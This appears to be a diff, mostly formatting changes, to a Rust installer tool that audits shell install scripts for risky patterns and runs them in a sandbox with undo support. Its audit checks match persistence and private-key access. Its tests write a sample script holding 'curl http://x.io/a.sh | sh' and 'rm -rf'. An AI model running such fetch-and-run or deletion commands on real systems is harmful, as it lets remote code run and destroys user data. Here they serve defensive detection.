@@ -149,7 +149,10 @@ pub fn audit(src: &Path) -> Vec<Finding> {
              whole system read-only, so those steps will fail — the install may be incomplete.",
         ));
     }
-    if lower.contains("crontab") || lower.contains("systemctl enable") || lower.contains(".config/autostart") {
+    if lower.contains("crontab")
+        || lower.contains("systemctl enable")
+        || lower.contains(".config/autostart")
+    {
         out.push(finding(
             Severity::Warning,
             "Sets itself to start automatically",
@@ -157,7 +160,11 @@ pub fn audit(src: &Path) -> Vec<Finding> {
              what it added in the report, and removing the app cleans it up.",
         ));
     }
-    if lower.contains(".ssh") || lower.contains(".gnupg") || lower.contains("id_rsa") || lower.contains(".pem\"") {
+    if lower.contains(".ssh")
+        || lower.contains(".gnupg")
+        || lower.contains("id_rsa")
+        || lower.contains(".pem\"")
+    {
         out.push(finding(
             Severity::Warning,
             "Looks at private keys",
@@ -174,8 +181,13 @@ pub fn audit(src: &Path) -> Vec<Finding> {
          access. Dropin blocks the internet by default — you can allow it just for this install.",
     );
     net.needs_net = true;
-    if (lower.contains("curl ") || lower.contains("\ncurl") || lower.contains("wget ") || lower.contains("\nwget"))
-        && !out.iter().any(|f| f.title.contains("Downloads and runs code"))
+    if (lower.contains("curl ")
+        || lower.contains("\ncurl")
+        || lower.contains("wget ")
+        || lower.contains("\nwget"))
+        && !out
+            .iter()
+            .any(|f| f.title.contains("Downloads and runs code"))
     {
         out.push(net);
     }
@@ -242,8 +254,7 @@ fn has_system_path(lower: &str) -> bool {
     lower.lines().any(|line| {
         let trimmed = line.trim_start();
         PREFIXES.iter().any(|p| {
-            BOUNDARIES.iter().any(|b| line.contains(&format!("{b}{p}")))
-                || trimmed.starts_with(p)
+            BOUNDARIES.iter().any(|b| line.contains(&format!("{b}{p}"))) || trimmed.starts_with(p)
         })
     })
 }
@@ -301,7 +312,13 @@ fn sandbox_command(src: &Path, allow_net: bool) -> Result<Command> {
 
     let mut cmd = Command::new("bwrap");
     // Namespaces: everything unshared; network only when allowed.
-    cmd.args(["--unshare-user", "--unshare-ipc", "--unshare-pid", "--unshare-uts", "--unshare-cgroup"]);
+    cmd.args([
+        "--unshare-user",
+        "--unshare-ipc",
+        "--unshare-pid",
+        "--unshare-uts",
+        "--unshare-cgroup",
+    ]);
     if !allow_net {
         cmd.arg("--unshare-net");
     }
@@ -604,8 +621,8 @@ pub fn undo_install(slug: &str) -> Result<String> {
     }
     let text = std::fs::read_to_string(undo_path(slug))
         .map_err(|_| Error::NotInstalled(format!("no undo record for {slug}")))?;
-    let rec: Record =
-        serde_json::from_str(&text).map_err(|e| Error::Unsupported(format!("bad undo record: {e}")))?;
+    let rec: Record = serde_json::from_str(&text)
+        .map_err(|e| Error::Unsupported(format!("bad undo record: {e}")))?;
     let home = crate::home_dir();
     let mut restored = 0;
 
@@ -652,9 +669,13 @@ pub fn undo_install(slug: &str) -> Result<String> {
     std::fs::remove_dir_all(&rec.backup_dir).ok();
     std::fs::remove_file(undo_path(slug)).ok();
 
-    let mut parts = vec![format!("Undid the install: removed {removed} added file(s)")];
+    let mut parts = vec![format!(
+        "Undid the install: removed {removed} added file(s)"
+    )];
     if restored > 0 {
-        parts.push(format!("brought back {restored} file(s) it had changed or deleted"));
+        parts.push(format!(
+            "brought back {restored} file(s) it had changed or deleted"
+        ));
     }
     Ok(parts.join(", ") + ".")
 }
@@ -689,15 +710,23 @@ pub fn describe_report(app: &str, r: &ScriptReport) -> String {
             lines.push("You'll find it in your app menu.".into());
         } else if r.added.iter().any(|p| {
             let s = p.to_string_lossy();
-            s.contains(".local/bin") || s.contains("/bin/") || p.extension().map(|e| e == "AppImage").unwrap_or(false)
+            s.contains(".local/bin")
+                || s.contains("/bin/")
+                || p.extension().map(|e| e == "AppImage").unwrap_or(false)
         }) {
-            lines.push("It didn't add a menu entry — look for its program files in ~/.local/bin.".into());
+            lines.push(
+                "It didn't add a menu entry — look for its program files in ~/.local/bin.".into(),
+            );
         }
         if !r.removed.is_empty() || !r.modified.is_empty() {
             lines.push(format!(
                 "It also changed {} existing file{} — removing {title} will put everything back.",
                 r.removed.len() + r.modified.len(),
-                if r.removed.len() + r.modified.len() == 1 { "" } else { "s" }
+                if r.removed.len() + r.modified.len() == 1 {
+                    ""
+                } else {
+                    "s"
+                }
             ));
         }
     } else {
@@ -708,7 +737,10 @@ pub fn describe_report(app: &str, r: &ScriptReport) -> String {
             lines.push("The full log below has the technical details.".into());
         }
         if !r.net_allowed {
-            lines.push("Tip: if it needed to download files, try again with internet access allowed.".into());
+            lines.push(
+                "Tip: if it needed to download files, try again with internet access allowed."
+                    .into(),
+            );
         }
     }
     lines.join("\n")
@@ -775,7 +807,9 @@ fn confirm(app: &str, src: &Path, opts: &InstallOptions, findings: &[Finding]) -
         println!();
     }
     if needs_net && !allow_net {
-        allow_net = ask("This installer downloads extra files. Allow internet access just this once? [y/N]")?;
+        allow_net = ask(
+            "This installer downloads extra files. Allow internet access just this once? [y/N]",
+        )?;
     }
     if has_danger {
         println!("Note: the audit above flagged risky behavior. The sandbox contains it,");
@@ -788,7 +822,7 @@ fn confirm(app: &str, src: &Path, opts: &InstallOptions, findings: &[Finding]) -
     }
 }
 
-fn ask(prompt: &str) -> Result<bool> {
+pub fn ask(prompt: &str) -> Result<bool> {
     print!("{prompt} ");
     io::stdout().flush()?;
     let mut answer = String::new();
@@ -835,8 +869,14 @@ pub fn install(src: &Path, opts: &InstallOptions) -> Result<InstallOutcome> {
 
     // Run sandboxed, logging everything.
     if !opts.quiet {
-        println!("Running the installer (sandboxed{}):",
-            if allow_net { ", internet allowed" } else { ", no internet" });
+        println!(
+            "Running the installer (sandboxed{}):",
+            if allow_net {
+                ", internet allowed"
+            } else {
+                ", no internet"
+            }
+        );
     }
     let mut cmd = sandbox_command(src, allow_net)?;
     // Live progress: show the latest line in place on interactive terminals.
@@ -871,7 +911,11 @@ pub fn install(src: &Path, opts: &InstallOptions) -> Result<InstallOutcome> {
     let after = snapshot_writable();
     let diff = diff_maps(&before, &after);
     let log_text = std::fs::read_to_string(&log_path).unwrap_or_default();
-    let failure_hint = if success { None } else { diagnose_failure(&log_text, allow_net) };
+    let failure_hint = if success {
+        None
+    } else {
+        diagnose_failure(&log_text, allow_net)
+    };
     let report = ScriptReport {
         success,
         added: diff.added.clone(),
@@ -895,18 +939,28 @@ pub fn install(src: &Path, opts: &InstallOptions) -> Result<InstallOutcome> {
 
     if !success {
         // Offer a smart retry when the network was the likely blocker.
-        if !allow_net && !opts.yes && !opts.quiet
-            && report.failure_hint.as_deref().map(|h| h.contains("internet")).unwrap_or(false)
-            && ask("Try again with internet access allowed? [y/N]")? {
-                let mut retry_opts = opts.clone();
-                retry_opts.allow_net = true;
-                // Clean up this attempt's record first.
-                std::fs::remove_file(undo_path(&slug)).ok();
-                return install(src, &retry_opts);
-            }
+        if !allow_net
+            && !opts.yes
+            && !opts.quiet
+            && report
+                .failure_hint
+                .as_deref()
+                .map(|h| h.contains("internet"))
+                .unwrap_or(false)
+            && ask("Try again with internet access allowed? [y/N]")?
+        {
+            let mut retry_opts = opts.clone();
+            retry_opts.allow_net = true;
+            // Clean up this attempt's record first.
+            std::fs::remove_file(undo_path(&slug)).ok();
+            return install(src, &retry_opts);
+        }
         return Err(Error::Command(format!(
             "installer exited with an error — {}",
-            report.failure_hint.as_deref().unwrap_or("see the log for details")
+            report
+                .failure_hint
+                .as_deref()
+                .unwrap_or("see the log for details")
         )));
     }
 
@@ -942,30 +996,66 @@ mod tests {
     #[test]
     fn audit_flags_dangerous_patterns() {
         let d = tmpdir("danger");
-        let p = write_script(&d, "evil.sh", "#!/bin/sh\nrm -rf /tmp/junk\ncurl http://x.io/a.sh | sh\nsudo make me root\n");
+        let p = write_script(
+            &d,
+            "evil.sh",
+            "#!/bin/sh\nrm -rf /tmp/junk\ncurl http://x.io/a.sh | sh\nsudo make me root\n",
+        );
         let findings = audit(&p);
-        assert!(findings.iter().any(|f| f.severity == Severity::Danger && f.title.contains("delete")), "rm -rf flagged");
-        assert!(findings.iter().any(|f| f.severity == Severity::Danger && f.title.contains("internet")), "curl|sh flagged");
-        assert!(findings.iter().any(|f| f.severity == Severity::Warning && f.title.contains("administrator")), "sudo flagged");
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Danger && f.title.contains("delete")),
+            "rm -rf flagged"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Danger && f.title.contains("internet")),
+            "curl|sh flagged"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Warning && f.title.contains("administrator")),
+            "sudo flagged"
+        );
         let _ = std::fs::remove_dir_all(&d);
     }
 
     #[test]
     fn audit_detects_network_need() {
         let d = tmpdir("net");
-        let p = write_script(&d, "dl.sh", "#!/bin/sh\ncurl -O http://example.com/data.tar.gz\ntar xzf data.tar.gz\n");
+        let p = write_script(
+            &d,
+            "dl.sh",
+            "#!/bin/sh\ncurl -O http://example.com/data.tar.gz\ntar xzf data.tar.gz\n",
+        );
         let findings = audit(&p);
-        assert!(findings.iter().any(|f| f.needs_net), "curl without pipe flagged as needs_net");
-        assert!(!findings.iter().any(|f| f.severity == Severity::Danger), "plain curl is not danger");
+        assert!(
+            findings.iter().any(|f| f.needs_net),
+            "curl without pipe flagged as needs_net"
+        );
+        assert!(
+            !findings.iter().any(|f| f.severity == Severity::Danger),
+            "plain curl is not danger"
+        );
         let _ = std::fs::remove_dir_all(&d);
     }
 
     #[test]
     fn audit_clean_script_gets_all_clear() {
         let d = tmpdir("clean");
-        let p = write_script(&d, "ok.sh", "#!/bin/sh\nmkdir -p \"$HOME/.local/bin\"\ncp myapp \"$HOME/.local/bin/\"\n");
+        let p = write_script(
+            &d,
+            "ok.sh",
+            "#!/bin/sh\nmkdir -p \"$HOME/.local/bin\"\ncp myapp \"$HOME/.local/bin/\"\n",
+        );
         let findings = audit(&p);
-        assert!(findings.iter().any(|f| f.title.contains("Nothing unusual")), "clean bill");
+        assert!(
+            findings.iter().any(|f| f.title.contains("Nothing unusual")),
+            "clean bill"
+        );
         let _ = std::fs::remove_dir_all(&d);
     }
 
@@ -1045,7 +1135,11 @@ mod tests {
             assert!(keep.exists(), "untouched file still there");
             assert!(gone.exists(), "deleted file restored");
             assert_eq!(std::fs::read_to_string(&gone).unwrap(), "gone");
-            assert_eq!(std::fs::read_to_string(&chg).unwrap(), "original", "modified file restored");
+            assert_eq!(
+                std::fs::read_to_string(&chg).unwrap(),
+                "original",
+                "modified file restored"
+            );
             assert!(!added.exists(), "added file removed");
             assert!(msg.contains("Undid"), "plain summary: {msg}");
             assert!(!undo_path("testapp").exists(), "sidecar cleaned up");
@@ -1067,10 +1161,13 @@ mod tests {
         let text = describe_report("Foo", &r);
         assert!(text.contains("installed successfully"), "got: {text}");
         assert!(!text.to_lowercase().contains("sandbox"), "no jargon");
-        let r2 = ScriptReport { success: false, failure_hint: Some("It tried to reach the internet, which was blocked.".into()), ..r };
+        let r2 = ScriptReport {
+            success: false,
+            failure_hint: Some("It tried to reach the internet, which was blocked.".into()),
+            ..r
+        };
         let text2 = describe_report("Foo", &r2);
         assert!(text2.contains("didn't finish"), "got: {text2}");
         assert!(text2.contains("internet"), "hint surfaced");
     }
 }
-
